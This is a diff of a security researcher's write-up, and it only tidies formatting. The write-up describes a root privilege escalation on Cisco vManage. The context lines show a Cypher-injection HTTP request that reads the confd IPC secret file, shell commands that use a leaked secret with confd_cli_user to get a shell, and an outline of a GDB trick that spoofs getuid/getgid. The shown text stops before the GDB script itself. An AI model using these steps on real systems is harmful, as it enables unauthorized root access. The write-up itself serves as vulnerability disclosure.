@@ -7,7 +7,6 @@
 After digging a little through some [documentation](http://66.218.245.39/doc/html/rn03re18.html) related to `confd` and the different binaries (accessible with an account on the Cisco website), we found that to authenticate the IPC socket, it uses a secret located in `/etc/confd/confd_ipc_secret`:
 
 ```
-
 vmanage:~$ ls -al /etc/confd/confd_ipc_secret 
 
 -rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
@@ -16,7 +15,6 @@ vmanage:~$ ls -al /etc/confd/confd_ipc_secret
 Remember our Neo4j instance? It is running under the `vmanage` user's privileges, thus allowing us to retrieve the file using the previous vulnerability:
 
 ```
-
 GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1
 
 Host: vmanage-XXXXXX.viptela.net 
@@ -31,7 +29,6 @@ Host: vmanage-XXXXXX.viptela.net
 The `confd_cli` program does not support command line arguments but calls `/usr/bin/confd_cli_user` with arguments. So, we could directly call `/usr/bin/confd_cli_user` with our own set of arguments. However it's not readable with our current privileges, so we have to retrieve it from the rootfs and copy it using scp, read the help, and use it to get the shell:
 
 ```
-
 vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret
 
 vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret 
@@ -95,13 +92,13 @@ root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/
 … snipped …
 ```
 
-I hypothesized the “confd_cli” program passes the user ID and group ID it collected from the logged in user to the “cmdptywrapper” application.
+I hypothesized the “confd\_cli” program passes the user ID and group ID it collected from the logged in user to the “cmdptywrapper” application.
 
 My first attempt was to run the “cmdptywrapper” directly and supplying it with `-g 0 -u 0`, but it failed. It appears a file descriptor (-i 1015) was created somewhere along the way and I cannot fake it.
 
 As mentioned in synacktiv’s blog(last example), the `confd_cli` program does not support command line argument, but I can influence it with a debugger and fortunately GDB is included on the system.
 
-I created a GDB script where I forced the API `getuid `and `getgid` to return 0. Since I already have “vmanage” privilege through the deserialization RCE, I have permission to read the `/etc/confd/confd_ipc_secret` directly.
+I created a GDB script where I forced the API `getuid` and `getgid` to return 0. Since I already have “vmanage” privilege through the deserialization RCE, I have permission to read the `/etc/confd/confd_ipc_secret` directly.
 
 root.gdb:
 
